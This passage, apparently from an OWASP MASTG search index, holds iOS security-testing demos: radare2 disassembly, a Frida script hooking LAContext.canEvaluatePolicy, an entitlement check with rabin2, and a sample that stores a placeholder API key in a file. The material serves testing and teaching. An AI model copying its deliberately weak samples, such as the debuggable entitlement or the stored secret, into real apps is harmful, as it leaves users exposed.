\u2502\u2502   0x100008e28      movz w0, 0x2f                             ; '/'\n\u2502      \u2502\u2502   0x100008e2c      bl sym Swift._StringGuts.grow(Swift.Int) -&gt; () ; sym.imp.Swift._StringGuts.grow_Swift.Int_______\n\u2502      \u2502\u2502   0x100008e30      ldr x0, [arg0]                            ; 0x4 ; 4 ; void *arg0\n\u2502      \u2502\u2502   0x100008e34      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502      \u2502\u2502   0x100008e38      add x8, x22, 0x10\n\u2502      \u2502\u2502   0x100008e3c      adrp x9, sym.imp.__error                  ; 0x10011d000\n\u2502      \u2502\u2502   0x100008e40      add x9, x9, 0xb80                         ; 0x10011db80 ; \"Warning: Running on a simulator (\"\n\u2502      \u2502\u2502   0x100008e44      sub x9, x9, 0x20\n\u2502      \u2502\u2502   0x100008e48      orr x9, x9, 0x8000000000000000\n\u2502      \u2502\u2502   0x100008e4c      stp x8, x9, [sp]\n\u2502      \u2502\u2502   0x100008e50      mov x20, sp\n\u2502      \u2502\u2502   0x100008e54      mov x0, x21\n\u2502      \u2502\u2502   0x100008e58      mov x1, x19\n\u2502      \u2502\u2502   0x100008e5c      bl sym Swift.String.append(Swift.String) -&gt; () ; sym.imp.Swift.String.append_Swift.String_______\n\u2502      \u2502\u2502   0x100008e60      mov x0, x19                               ; void *arg0\n\u2502      \u2502\u2502   0x100008e64      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502      \u2502\u2502   0x100008e68      mov x20, sp\n\u2502      \u2502\u2502   0x100008e6c      movz x0, 0x2e29                           ; ').'\n\u2502      \u2502\u2502   0x100008e70      movk x0, 0xa0a, lsl 16                    ; '\\n\\n'\n\u2502      \u2502\u2502   0x100008e74      movk x0, 0x7250, lsl 32                   ; 'Pr'\n\u2502      \u2502\u2502   0x100008e78      movk x0, 0x6f6f, lsl 48                   ; 'oo'\n\u2502      \u2502\u2502   0x100008e7c      movz x1, 0x3a66                           ; 'f:'\n\u2502      \u2502\u2502   0x100008e80      movk x1, 0xa0a, lsl 16                    ; '\\n\\n'\n\u2502      \u2502\u2502   0x100008e84      movk x1, 0xec00, lsl 48\n\u2502      \u2502\u2502   0x100008e88      bl sym Swift.String.append(Swift.String) -&gt; () ; sym.imp.Swift.String.append_Swift.String_______\n\u2502      \u2502\u2502   0x100008e8c      ldp x20, x19, [sp]\n\u2502      \u2502\u2502   0x100008e90      bl sym.func.1000082b4\n\u2502      \u2502\u2502   0x100008e94      mov x21, x0\n\u2502      \u2502\u2502   0x100008e98      mov x22, x1\n\u2502      \u2502\u2502   0x100008e9c      stp x20, x19, [sp]\n\u2502      \u2502\u2502   0x100008ea0      mov x0, x19                               ; void *arg0\n\u2502      \u2502\u2502   0x100008ea4      bl sym.imp.swift_bridgeObjectRetain       ; void *swift_bridgeObjectRetain(void *arg0)\n\u2502      \u2502\u2502   0x100008ea8      mov x20, sp\n\u2502      \u2502\u2502   0x100008eac      mov x0, x21\n\u2502      \u2502\u2502   0x100008eb0      mov x1, x22\n\u2502      \u2502\u2502   0x100008eb4      bl sym Swift.String.append(Swift.String) -&gt; () ; sym.imp.Swift.String.append_Swift.String_______\n\u2502      \u2502\u2502   0x100008eb8      mov x0, x19                               ; void *arg0\n\u2502      \u2502\u2502   0x100008ebc      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502      \u2502\u2502   0x100008ec0      mov x0, x22\n\u2502      \u2502\u2502   ; CODE XREF from sym.func.100008c14 @ 0x100008de8(x)\n\u2502      \u2514\u2500\u2500&gt; 0x100008ec4      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502       \u2502   0x100008ec8      ldp x0, x1, [sp]\n\u2502       \u2502   ; CODE XREF from sym.func.100008c14 @ 0x100008e08(x)\n\u2502       \u2514\u2500&gt; 0x100008ecc      ldp x29, x30, [var_50h]\n\u2502           0x100008ed0      ldp x20, x19, [var_40h]\n\u2502           0x100008ed4      ldp x22, x21, [var_30h]\n\u2502           0x100008ed8      ldp x24, x23, [var_20h]\n\u2502           0x100008edc      ldp x26, x25, [var_10h]\n\u2502           0x100008ee0      add sp, arg_60h\n\u2514           0x100008ee4      ret\n</code></pre>","tags":["ios","demo","MASTG-TEST-0240"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0021/MASTG-DEMO-0021/#evaluation","title":"Evaluation","text":"<p>The test passes because jailbreak detection checks are implemented in the app.</p>","tags":["ios","demo","MASTG-TEST-0240"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0024/MASTG-DEMO-0024/","title":"MASTG-DEMO-0024: Uses of LAContext.canEvaluatePolicy with r2","text":"<p>  Download MASTG-DEMO-0024 IPA   Open MASTG-DEMO-0024 Folder  Build MASTG-DEMO-0024 IPA</p>","tags":["ios","demo","MASTG-TEST-0248"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0024/MASTG-DEMO-0024/#sample","title":"Sample","text":"<p>The following sample checks whether the device has a set passcode.</p> MastgTest.swift<pre><code>import SwiftUI\nimport LocalAuthentication\n\nstruct MastgTest {\n\n  static func mastgTest(completion: @escaping (String) -&gt; Void) {\n    if devicePasscodeSet(){\n      completion(\"This device is protected with a passcode \u2705\")\n    }\n    else{\n      completion(\"This device doesn't have a passcode \u26a0\ufe0f\")\n    }\n  }\n\n  static func devicePasscodeSet() -&gt; Bool {\n      // Use LAPolicy.deviceOwnerAuthentication to verify if the device has a passcode.\n      // According to docs: \"In iOS, policy evaluation fails with the error passcodeNotSet if the device passcode isn\u2019t enabled\"\n      // Ref: https://developer.apple.com/documentation/localauthentication/lapolicy/deviceownerauthentication\n      return LAContext().canEvaluatePolicy(.deviceOwnerAuthentication, error: nil)\n    }\n\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0248"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0024/MASTG-DEMO-0024/#steps","title":"Steps","text":"<ol> <li>Unzip the app package and locate the main binary file ( Exploring the App Package), which in this case is <code>./Payload/MASTestApp.app/MASTestApp</code>.</li> <li>Run <code>run.sh</code>.</li> </ol> isDevicePasscodeSet.r2<pre><code>e asm.bytes=false\ne scr.color=false\ne asm.var=false\n\n?e Print xrefs to \\'canEvaluatePolicy\\\"\nf~canEvaluatePolicy\n\n?e\n\n?e Print xrefs to 0x100008360\naxt @ 0x100008360\n\n?e\n\n?e Print xrefs to 0x1000100a0\naxt @ 0x1000100a0\n\n?e\n\n?e Print disassembly around \\\"canEvaluatePolicy\\\" in the function\npdf @ 0x100004f10 | grep -C 5 \"canEvaluatePolicy:error:\"\n</code></pre> run.sh<pre><code>#!/bin/bash\nr2 -q -i isDevicePasscodeSet.r2 -e emu.str=true -A MASTestApp &gt; output.asm\n</code></pre>","tags":["ios","demo","MASTG-TEST-0248"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0024/MASTG-DEMO-0024/#observation","title":"Observation","text":"output.asm<pre><code>Print xrefs to 'canEvaluatePolicy\"\n0x100008360 24 str.canEvaluatePolicy:error:\nPrint xrefs to 0x100008360\n(nofunc) 0x100000350 [UNKNOWN] invalid\nsym.func.100004ea8 0x100004f10 [STRING] ldr x1, [x8, 0xa0]\nPrint disassembly around \"canEvaluatePolicy\" in the function\n\u2502           0x100004f0c      adrp x8, sym.__METACLASS_DATA__TtC10MASTestAppP33_9471609302C95FC8EC1D59DD4CF2A2DB19ResourceBundleClass ; 0x100010000 ; x8=0x100010000 -&gt; 0x81\n\u2502           0x100004f10      ldr x1, [x8, 0xa0]                        ; 0x100008360 ; char *selector ; tmp=0x1000100a0 ; x1=0x100008360 -&gt; 0x456e6163 section.8.__TEXT.__objc_methname\n\u2502           0x100004f14      movz w2, 0x2                              ; w2=0x2\n\u2502           0x100004f18      movz x3, 0                                ; x3=0x0\n\u2502           0x100004f1c      bl sym.imp.objc_msgSend                   ; void *objc_msgSend(void *instance, char *selector) ; lr=0x100004f20 -&gt; 0xaa0003f7 ; pc=0x100007794 \"0\"\n\u2502                                                                      ; void *objc_msgSend(-1, \"canEvaluatePolicy:error:\")\n</code></pre> <p>The output reveals the use of <code>LAContext().canEvaluatePolicy(.deviceOwnerAuthentication, error: nil)</code> in the app. However, it's not exactly the same in the output because the compiler transformed this function call into an Objective-C counterpart under the hood. Therefore, an equivalent Objective-C representation in the binary should look like <code>objc_msgSend(void *address, \"canEvaluatePolicy:error:\", LAPolicyDeviceOwnerAuthentication)</code>. By looking at the output we can find this pattern at line 11/12.</p> <p>The third argument of <code>objc_msgSend(...)</code> is <code>LAPolicyDeviceOwnerAuthentication</code> because <code>w2</code> register at the time of the function invocation is set to <code>2</code> with a <code>mov</code> instruction at Line 9. <code>2</code> is an enum representation of <code>LAPolicyDeviceOwnerAuthentication</code>.</p>","tags":["ios","demo","MASTG-TEST-0248"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0024/MASTG-DEMO-0024/#evaluation","title":"Evaluation","text":"<p>The test passes because the output shows references to passcode verification APIs.</p>","tags":["ios","demo","MASTG-TEST-0248"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0026/MASTG-DEMO-0026/","title":"MASTG-DEMO-0026: Runtime Use of LAContext.canEvaluatePolicy with Frida","text":"<p>  Download MASTG-DEMO-0026 IPA   Open MASTG-DEMO-0026 Folder  Build MASTG-DEMO-0026 IPA</p>","tags":["ios","demo","MASTG-TEST-0246"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0026/MASTG-DEMO-0026/#sample","title":"Sample","text":"<p>The following sample checks whether the device has a set passcode.</p> MastgTest.swift<pre><code>import SwiftUI\nimport LocalAuthentication\n\nstruct MastgTest {\n\n  static func mastgTest(completion: @escaping (String) -&gt; Void) {\n    if devicePasscodeSet(){\n      completion(\"This device is protected with a passcode \u2705\")\n    }\n    else{\n      completion(\"This device doesn't have a passcode \u26a0\ufe0f\")\n    }\n  }\n\n  static func devicePasscodeSet() -&gt; Bool {\n      // Use LAPolicy.deviceOwnerAuthentication to verify if the device has a passcode.\n      // According to docs: \"In iOS, policy evaluation fails with the error passcodeNotSet if the device passcode isn\u2019t enabled\"\n      // Ref: https://developer.apple.com/documentation/localauthentication/lapolicy/deviceownerauthentication\n      return LAContext().canEvaluatePolicy(.deviceOwnerAuthentication, error: nil)\n    }\n\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0246"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0026/MASTG-DEMO-0026/#steps","title":"Steps","text":"<ol> <li>Install the app on a device ( Installing Apps)</li> <li>Make sure you have  Frida for iOS installed on your machine and the frida-server running on the device</li> <li>Run <code>run.sh</code> to spawn your app with Frida</li> <li>Click the Start button</li> <li>Stop the script by pressing <code>Ctrl+C</code></li> </ol> run.shscript.js <pre><code>#!/bin/bash\nfrida -U -f org.owasp.mastestapp.MASTestApp-iOS -l ./script.js -o output.txt\n</code></pre> <pre><code>Interceptor.attach(ObjC.classes.LAContext[\"- canEvaluatePolicy:error:\"].implementation, {\n  onEnter(args) {\n\n      const LAPolicy = {\n          1: \".deviceOwnerAuthenticationWithBiometrics\",\n          2: \".deviceOwnerAuthentication\"\n      };\n\n      const policy = args[2].toInt32();\n      const policyDescription = LAPolicy[policy] || \"Unknown Policy\";\n\n      console.log(`\\nLAContext.canEvaluatePolicy(${args[2]}) called with ${policyDescription} (${args[2]})\\n`);\n\n      // Use an arrow function so that `this` remains the same as in onEnter\n      const printBacktrace = (maxLines = 8) =&gt; {\n          console.log(\"\\nBacktrace:\");\n          let backtrace = Thread.backtrace(this.context, Backtracer.ACCURATE)\n              .map(DebugSymbol.fromAddress);\n\n          for (let i = 0; i &lt; Math.min(maxLines, backtrace.length); i++) {\n              console.log(backtrace[i]);\n          }\n      }\n      printBacktrace();\n  }\n});\n</code></pre>","tags":["ios","demo","MASTG-TEST-0246"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0026/MASTG-DEMO-0026/#observation","title":"Observation","text":"output.txt<pre><code>LAContext.canEvaluatePolicy(0x2) called with .deviceOwnerAuthentication (0x2)\n\n\nBacktrace:\n0x100f58110 MASTestApp.debug.dylib!static MastgTest.devicePasscodeSet()\n0x100f5802c MASTestApp.debug.dylib!static MastgTest.mastgTest(completion:)\n0x100f599d4 MASTestApp.debug.dylib!$s10MASTestApp11ContentViewV4bodyQrvg7SwiftUI05TupleD0VyAE0D0PAEE7paddingyQrAE4EdgeO3SetV_12CoreGraphics7CGFloatVSgtFQOyAE6HStackVyAGyAE4TextV_AE6SpacerVAiEEAJyQrAN_ARtFQOyAiEE12cornerRadius_11antialiasedQrAQ_SbtFQOyAiEE10background_9alignmentQrqd___AE9AlignmentVtAeHRd__lFQOyAE6ButtonVyAiEE4fontyQrAE4FontVSgFQOyAiEEAJyQrAN_ARtFQOyAiEEAJyQrAN_ARtFQOyAV_Qo__Qo__Qo_G_AE14LinearGradientVQo__Qo__Qo_tGG_Qo__AiEEAJyQrAN_ARtFQOyAiEEAY_AZQrAQ_SbtFQOyAiEEA__A0_Qrqd___A2_tAeHRd__lFQOyAiEE5frame8minWidth10idealWidth8maxWidth9minHeight11idealHeight9maxHeightA0_QrAR_A5RA2_tFQOyAE06ScrollD0VyAiEEAJyQrAN_ARtFQOyAiEEA21_A22_A23_A24_A25_A26_A27_A0_QrAR_A5RA2_tFQOyAV_Qo__Qo_G_Qo__AE5ColorVQo__Qo__Qo_tGyXEfU_A18_yXEfU_yyScMYccfU_\n0x19afc6e30 SwiftUI!partial apply for implicit closure #2 in implicit closure #1 in WrappedButtonStyle.Body.body.getter\n0x19b2ddf28 SwiftUI!closure #1 in PressableGestureCallbacks.dispatch(phase:state:)\n0x19b047b98 SwiftUI!thunk for @escaping @callee_guaranteed () -&gt; ()\n0x19b047bc0 SwiftUI!thunk for @escaping @callee_guaranteed () -&gt; (@out ())\n0x19b047b98 SwiftUI!thunk for @escaping @callee_guaranteed () -&gt; ()\n</code></pre> <p>The output reveals the use of <code>LAcontext.canEvaluatePolicy(0x2)</code> in the app. Policy <code>0x2</code> is <code>.deviceOwnerAuthentication</code>.</p>","tags":["ios","demo","MASTG-TEST-0246"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0026/MASTG-DEMO-0026/#evaluation","title":"Evaluation","text":"<p>The test passes because the output shows the runtime use of <code>LAcontext.canEvaluatePolicy(.deviceOwnerAuthentication)</code> which verifies whether the device has passcode set.</p>","tags":["ios","demo","MASTG-TEST-0246"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0036/MASTG-DEMO-0036/","title":"MASTG-DEMO-0036: Debuggable Entitlement Enabled in the entitlements.plist with rabin2","text":"<p>  Download MASTG-DEMO-0036 IPA   Open MASTG-DEMO-0036 Folder  Build MASTG-DEMO-0036 IPA</p>","tags":["ios","demo","MASTG-TEST-0261"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0036/MASTG-DEMO-0036/#sample","title":"Sample","text":"<p>The sample code includes the entitlements.plist file with the `get-task-allow' entitlement, which makes the app debuggable.</p> entitlements.plist<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n    &lt;key&gt;application-identifier&lt;/key&gt;\n    &lt;string&gt;AYRP7NNB54.org.owasp.mastestapp.MASTestApp-iOS&lt;/string&gt;\n    &lt;key&gt;com.apple.developer.team-identifier&lt;/key&gt;\n    &lt;string&gt;AYRP7NNB54&lt;/string&gt;\n    &lt;key&gt;get-task-allow&lt;/key&gt;\n    &lt;true/&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre>","tags":["ios","demo","MASTG-TEST-0261"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0036/MASTG-DEMO-0036/#steps","title":"Steps","text":"<ol> <li>Unzip the app package and locate the main binary file ( Exploring the App Package), which in this case is <code>./Payload/MASTestApp.app/MASTestApp</code>.</li> <li>Run  rabin2 with the <code>-OC</code> options to obtain the entitlements file.</li> </ol> run.sh<pre><code>rabin2 -OC MASTestApp | grep -A1 get-task-allow\n</code></pre>","tags":["ios","demo","MASTG-TEST-0261"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0036/MASTG-DEMO-0036/#observation","title":"Observation","text":"<p>The output reveals the value of the <code>get-task-allow</code> entitlement.</p> output.asm<pre><code>        &lt;key&gt;get-task-allow&lt;/key&gt;\n        &lt;true/&gt;\n</code></pre>","tags":["ios","demo","MASTG-TEST-0261"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0036/MASTG-DEMO-0036/#evaluation","title":"Evaluation","text":"<p>The test fails because the app is debuggable due to the <code>get-task-allow</code> entitlement being present and set to <code>true</code>.</p>","tags":["ios","demo","MASTG-TEST-0261"]},{"location":"MASTG/demos/ios/MASVS-STORAGE/MASTG-DEMO-0019/MASTG-DEMO-0019/","title":"MASTG-DEMO-0019: Uses of isExcludedFromBackupKey with r2","text":"<p>  Download MASTG-DEMO-0019 IPA   Open MASTG-DEMO-0019 Folder  Build MASTG-DEMO-0019 IPA</p>","tags":["ios","demo","MASTG-TEST-0215"]},{"location":"MASTG/demos/ios/MASVS-STORAGE/MASTG-DEMO-0019/MASTG-DEMO-0019/#sample","title":"Sample","text":"<p>The code snippet below shows sample code that creates a file and marks it with <code>isExcludedFromBackupKey</code>.</p> MastgTest.swiftfunction.asmdecompiled-o1-review.swift <pre><code>import SwiftUI\n\nstruct MastgTest {\n    static func mastgTest(completion: @escaping (String) -&gt; Void) {\n    // Define the file name and create the file URL\n    let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!\n    let fileName = \"secret.txt\"\n    var fileURL = documentsDirectory.appendingPathComponent(fileName)\n\n    // Create the file content\n    let fileContent = \"MAS_API_KEY=8767086b9f6f976g-a8df76\"\n\n    do {\n        try fileContent.write(to: fileURL, atomically: true, encoding: .utf8)\n\n        // Set the isExcludedFromBackup flag\n        var resourceValues = URLResourceValues()\n        resourceValues.isExcludedFromBackup = true\n\n        try fileURL.setResourceValues(resourceValues)\n\n    } catch {\n      completion(\"Error creating file: \\(error)\")\n    }\n    completion(\"File created and isExcludedFromBackup flag set to true\")\n    }\n}\n</code></pre> <pre><code>            ;-- section.0.__TEXT.__text:\n            ;-- func.100004000:\n            ; NULL XREF from segment.__TEXT @ +0xd0(r)\n            ; CALL XREF from MASTestApp.ContentView.body.SwiftUI.Tuple...D0VyAE0D0PAEE7paddingyQrAE4EdgeO3SetV_12CoreGraphics7CGFloatVSgtFQOyAE6HStackVyAGyAE4TextV_AE6SpacerVAiEEAJyQrAN_ARtFQOyAiEE12cornerRadius_11antialiasedQrAQ_SbtFQOyAiEE10background_20ignoresSafeAreaEdgesQrqd___ANtAE10ShapeStyleRd__lFQOyAE6ButtonVyAiEE4fontyQrAE4FontVSgFQOyAiEEAJyQrAN_ARtFQOyAiEEAJyQrAN_ARtFQOyAV_Qo__Qo__Qo_G_AE14LinearGradientVQo__Qo__Qo_tGG_Qo__AiEEAJyQrAN_ARtFQOyAiEEAY_AZQrAQ_SbtFQOyAiEEA__A0_Qrqd___ANtAEA1_Rd__lFQOyAiEE5frame8minWidth10idealWidth8maxWidth9minHeight11idealHeight9maxHeight9alignmentQrAR_A5rE9AlignmentVtFQOyAE06ScrollD0VyAiEEAJyQrAN_ARtFQOyAiEEA20_A21_A22_A23_A24_A25_A26_A27_QrAR_A5RA29_tFQOyAV_Qo__Qo_G_Qo__AE5ColorVQo__Qo__Qo_tGyXEfU_A17_yXEfU_yycfU_...E0D0PAEE7paddingyQrAE4EdgeO3SetV_12CoreGraphics7CGFloatVSgtFQOyAE6HStackVyAGyAE4TextV_AE6SpacerVAiEEAJyQrAN_ARtFQOyAiEE12cornerRadius_11antialiasedQrAQ_SbtFQOyAiEE10background_20ignoresSafeAreaEdgesQrqd___ANtAE10ShapeStyleRd__lFQOyAE6ButtonVyAiEE4fontyQrAE4FontVSgFQOyAiEEAJyQrAN_ARtFQOyAiEEAJyQrAN_ARtFQOyAV_Qo__Qo__Qo_G_AE14LinearGradientVQo__Qo__Qo_tGG_Qo__AiEEAJyQrAN_ARtFQOyAiEEAY_AZQrAQ_SbtFQOyAiEEA__A0_Qrqd___ANtAEA1_Rd__lFQOyAiEE5frame8minWidth10idealWidth8maxWidth9minHeight11idealHeight9maxHeight9alignmentQrAR_A5rE9AlignmentVtFQOyAE06ScrollD0VyAiEEAJyQrAN_ARtFQOyAiEEA20_A21_A22_A23_A24_A25_A26_A27_QrAR_A5RA29_tFQOyAV_Qo__Qo_G_Qo__AE5ColorVQo__Qo__Qo_tGyXEfU_A17_yXEfU_yycfU_...D0PAEE7paddingyQrAE4EdgeO3SetV_12CoreGraphics7CGFloatVSgtFQOyAE6HStackVyAGyAE4TextV_AE6SpacerVAiEEAJyQrAN_ARtFQOyAiEE12cornerRadius_11antialiasedQrAQ_SbtFQOyAiEE10background_20ignoresSafeAreaEdgesQrqd___ANtAE10ShapeStyleRd__lFQOyAE6ButtonVyAiEE4fontyQrAE4FontVSgFQOyAiEEAJyQrAN_ARtFQOyAiEEAJyQrAN_ARtFQOyAV_Qo__Qo__Qo_G_AE14LinearGradientVQo__Qo__Qo_tGG_Qo__AiEEAJyQrAN_ARtFQOyAiEEAY_AZQrAQ_SbtFQOyAiEEA__A0_Qrqd___ANtAEA1_Rd__lFQOyAiEE5frame8minWidth10idealWidth8maxWidth9minHeight11idealHeight9maxHeight9alignmentQrAR_A5rE9AlignmentVtFQOyAE06ScrollD0VyAiEEAJyQrAN_ARtFQOyAiEEA20_A21_A22_A23_A24_A25_A26_A27_QrAR_A5RA29_tFQOyAV_Qo__Qo_G_Qo__AE5ColorVQo__Qo__Qo_tGyXEfU_A17_yXEfU_yycfU_.padding.Edge.Set.CoreGraphics.CGFloat.HStack.Text.Spacer.cornerRadius.antialiased.background.ignoresSafeAreaEdges.ShapeStyle.Button.font.Font.LinearGradient...A0_Qrqd___ANtAEA1_Rd__lFQOyAiEE5frame8minWidth10idealWidth8maxWidth9minHeight11idealHeight9maxHeight9alignmentQrAR_A5rE9AlignmentVtFQOyAE06ScrollD0VyAiEEAJyQrAN_ARtFQOyAiEEA20_A21_A22_A23_A24_A25_A26_A27_QrAR_A5RA29_tFQOyAV_Qo__Qo_G_Qo__AE5ColorVQo__Qo__Qo_tGyXEfU_A17_yXEfU_yycfU_._.frame.minWidth.idealWidth.maxWidth.minHeight.idealHeight.maxHeight.alignment.rE9Al.Scroll...D0VyAiEEAJyQrAN_ARtFQOyAiEEA20_A21_A22_A23_A24_A25_A26_A27_QrAR_A5RA29_tFQOyAV_Qo__Qo_G_Qo__AE5ColorVQo__Qo__Qo_tGyXEfU_A17_yXEfU_yycfU_._A21_A22_A23_A24_A25._A27_QrAR_A5RA29_tFQOyAV_Q.Color._yXEfU_yycfU_ @ 0x1000060a8(r) ; sym.MASTestApp.ContentView.body.SwiftUI.Tuple...D0VyAE0D0PAEE7paddingyQrAE4EdgeO3SetV_12CoreGraphics7CGFloatVSgtFQOyAE6HStackVyAGyAE4TextV_AE6SpacerVAiEEAJyQrAN_ARtFQOyAiEE12cornerRadius_11antialiasedQrAQ_SbtFQOyAiEE10background_20ignoresSafeAreaEdgesQrqd___ANtAE10ShapeStyleRd__lFQOyAE6ButtonVyAiEE4fontyQrAE4FontVSgFQOyAiEEAJyQrAN_ARtFQOyAiEEAJyQrAN_ARtFQOyAV_Qo__Qo__Qo_G_AE14LinearGradientVQo__Qo__Qo_tGG_Qo__AiEEAJyQrAN_ARtFQOyAiEEAY_AZQrAQ_SbtFQOyAiEEA__A0_Qrqd___ANtAEA1_Rd__lFQOyAiEE5frame8minWidth10idealWidth8maxWidth9minHeight11idealHeight9maxHeight9alignmentQrAR_A5rE9AlignmentVtFQOyAE06ScrollD0VyAiEEAJyQrAN_ARtFQOyAiEEA20_A21_A22_A23_A24_A25_A26_A27_QrAR_A5RA29_tFQOyAV_Qo__Qo_G_Qo__AE5ColorVQo__Qo__Qo_tGyXEfU_A17_yXEfU_yycfU_...E0D0PAEE7paddingyQrAE4EdgeO3SetV_12CoreGraphics7CGFloatVSgtFQOyAE6HStackVyAGyAE4TextV_AE6SpacerVAiEEAJyQrAN_ARtFQOyAiEE12cornerRadius_11antialiasedQrAQ_SbtFQOyAiEE10background_20ignoresSafeAreaEdgesQrqd___ANtAE10ShapeStyleRd__lFQOyAE6ButtonVyAiEE4fontyQrAE4FontVSgFQOyAiEEAJyQrAN_ARtFQOyAiEEAJyQrAN_ARtFQOyAV_Qo__Qo__Qo_G_AE14LinearGradientVQo__Qo__Qo_tGG_Qo__AiEEAJyQrAN_ARtFQOyAiEEAY_AZQrAQ_SbtFQOyAiEEA__A0_Qrqd___ANtAEA1_Rd__lFQOyAiEE5frame8minWidth10idealWidth8maxWidth9minHeight11idealHeight9maxHeight9alignmentQrAR_A5rE9AlignmentVtFQOyAE06ScrollD0VyAiEEAJyQrAN_ARtFQOyAiEEA20_A21_A22_A23_A24_A25_A26_A27_QrAR_A5RA29_tFQOyAV_Qo__Qo_G_Qo__AE5ColorVQo__Qo__Qo_tGyXEfU_A17_yXEfU_yycfU_...D0PAEE7paddingyQrAE4EdgeO3SetV_12CoreGraphics7CGFloatVSgtFQOyAE6HStackVyAGyAE4TextV_AE6SpacerVAiEEAJyQrAN_ARtFQOyAiEE12cornerRadius_11antialiasedQrAQ_SbtFQOyAiEE10background_20ignoresSafeAreaEdgesQrqd___ANtAE10ShapeStyleRd__lFQOyAE6ButtonVyAiEE4fontyQrAE4FontVSgFQOyAiEEAJyQrAN_ARtFQOyAiEEAJyQrAN_ARtFQOyAV_Qo__Qo__Qo_G_AE14LinearGradientVQo__Qo__Qo_tGG_Qo__AiEEAJyQrAN_ARtFQOyAiEEAY_AZQrAQ_SbtFQOyAiEEA__A0_Qrqd___ANtAEA1_Rd__lFQOyAiEE5frame8minWidth10idealWidth8maxWidth9minHeight11idealHeight9maxHeight9alignmentQrAR_A5rE9AlignmentVtFQOyAE06ScrollD0VyAiEEAJyQrAN_ARtFQOyAiEEA20_A21_A22_A23_A24_A25_A26_A27_QrAR_A5RA29_tFQOyAV_Qo__Qo_G_Qo__AE5ColorVQo__Qo__Qo_tGyXEfU_A17_yXEfU_yycfU_.padding.Edge.Set.CoreGraphics.CGFloat.HStack.Text.Spacer.cornerRadius.antialiased.background.ignoresSafeAreaEdges.ShapeStyle.Button.font.Font.LinearGradient...A0_Qrqd___ANtAEA1_Rd__lFQOyAiEE5frame8minWidth10idealWidth8maxWidth9minHeight11idealHeight9maxHeight9alignmentQrAR_A5rE9AlignmentVtFQOyAE06ScrollD0VyAiEEAJyQrAN_ARtFQOyAiEEA20_A21_A22_A23_A24_A25_A26_A27_QrAR_A5RA29_tFQOyAV_Qo__Qo_G_Qo__AE5ColorVQo__Qo__Qo_tGyXEfU_A17_yXEfU_yycfU_._.frame.minWidth.idealWidth.maxWidth.minHeight.idealHeight.maxHeight.alignment.rE9Al.Scroll...D0VyAiEEAJyQrAN_ARtFQOyAiEEA20_A21_A22_A23_A24_A25_A26_A27_QrAR_A5RA29_tFQOyAV_Qo__Qo_G_Qo__AE5ColorVQo__Qo__Qo_tGyXEfU_A17_yXEfU_yycfU_._A21_A22_A23_A24_A25._A27_QrAR_A5RA29_tFQOyAV_Q.Color._yXEfU_yycfU_\n\u250c 2384: sym.MASTestApp.MastgTest.mastg.completion...FZ (void *arg1, void *arg2, int64_t arg_10h, int64_t arg_20h);\n\u2502           0x100004000      stp x22, x21, [sp, -0x30]!                ; [00] -r-x section size 35856 named 0.__TEXT.__text\n\u2502           0x100004004      stp x20, x19, [var_0h_65x10]\n\u2502           0x100004008      stp x29, x30, [var_0h_19]\n\u2502           0x10000400c      add x29, sp, 0x20\n\u2502           0x100004010      sub sp, sp, 0x250\n\u2502           0x100004014      sub x8, x29, 0x28\n\u2502           0x100004018      stur x0, [x8, -0x100]                     ; arg1\n\u2502           0x10000401c      sub x8, x29, 0x30\n\u2502           0x100004020      stur x1, [x8, -0x100]                     ; arg2\n\u2502           0x100004024      adrp x8, sym.imp.swift_getObjCClassMetadata ; 0x10000d000\n\u2502           0x100004028      add x8, x8, 0xbda                         ; 0x10000dbda ; \"Fatal error\"\n\u2502           0x10000402c      sub x9, x29, 0xb0\n\u2502           0x100004030      stur x8, [x9, -0x100]\n\u2502           0x100004034      adrp x8, sym.imp.swift_getObjCClassMetadata ; 0x10000d000\n\u2502           0x100004038      add x8, x8, 0xba0                         ; 0x10000dba0 ; \"Unexpectedly found nil while unwrapping an Optional value\"\n\u2502           0x10000403c      sub x9, x29, 0xa8\n\u2502           0x100004040      stur x8, [x9, -0x100]\n\u2502           0x100004044      adrp x8, sym.imp.swift_getObjCClassMetadata ; 0x10000d000\n\u2502           0x100004048      add x8, x8, 0xb80                         ; 0x10000db80 ; \"MASTestApp/MastgTest.swift\"\n\u2502           0x10000404c      sub x9, x29, 0xa0\n\u2502           0x100004050      stur x8, [x9, -0x100]\n\u2502           0x100004054      stur xzr, [x29, -0x28]\n\u2502           0x100004058      stur xzr, [x29, -0x30]\n\u2502           